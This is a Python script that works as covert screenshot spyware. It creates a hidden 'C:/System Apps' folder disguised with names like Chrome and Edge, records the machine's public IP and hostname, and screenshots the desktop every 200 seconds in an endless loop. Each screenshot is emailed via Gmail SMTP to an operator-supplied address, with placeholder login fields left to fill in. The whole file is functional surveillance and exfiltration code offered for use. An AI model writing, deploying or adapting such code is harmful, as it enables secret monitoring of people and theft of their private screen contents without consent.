import requests
import time
import pyautogui
import random
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import socket
import subprocess
import shutil
from requests import get

ip = get('https://api.ipify.org').text

main_dir = "C:/System Apps"
os.makedirs(main_dir, exist_ok=True)

main_dir = "C:/System Apps/Calendar"
os.makedirs(main_dir, exist_ok=True)

main_dir = "C:/System Apps/Chrome"
os.makedirs(main_dir, exist_ok=True)

main_dir = "C:/System Apps/Edge"
os.makedirs(main_dir, exist_ok=True)

main_dir = "C:/System Apps/Other"
os.makedirs(main_dir, exist_ok=True)

main_dir = "C:/System Apps/Other/Other"
os.makedirs(main_dir, exist_ok=True)

subprocess.check_call(["attrib", "+H", "C:/System Apps"])
s = smtplib.SMTP("smtp.gmail.com", "587")

folder = 'C:/System Apps/Other/other'
for filename in os.listdir(folder):
    file_path = os.path.join(folder, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))

while True:
    today = datetime.now()
    try:
        a = requests.get('https://www.google.com/').status_code
        if a == 200:
            num_for_loop = random.randint(0, 100000000000000000)
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(fr'C:/System Apps/Other/Other/{num_for_loop}.png')
            with open(f"C:/System Apps/Other/Other/{num_for_loop}.png", 'rb') as f:
                naira = f.read()
            print("IMAGE HAS BEEN ENCODED, NOW SENDING")
            msg = MIMEMultipart()
            msg['Subject'] = f'Screenshot from {ip}'
            msg['From'] = 'TYPE YOUR EMAIL FROM WHERE U WANT TO SEND MESSAGE TO ANOTHER'
            msg['To'] = 'TYPE RECEIVER EMAIL ADDRESS THAT YOU WILL MANAGE AS WELL'
            text = MIMEText(f"Screenshot taken on - {today}\non computer named - " + socket.gethostname() + f"\nIP address of device - {ip}")
            msg.attach(text)
            image = MIMEImage(naira, name=os.path.basename("C:/System Apps/Other/Other/{num_for_loop}.png"))
            msg.attach(image)
            s = smtplib.SMTP("smtp.gmail.com", "587")
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login("LOGIN EMAIL ADDRESS", "LOGIN PASSWORD")
            s.sendmail("SENDER EMAIL ADDRESS", "RECEIVER EMAIL ADDRESS", msg.as_string())
            time.sleep(200)
    except:
        print("[UNEXPECTED] error happened while running this code, check your internet connection")
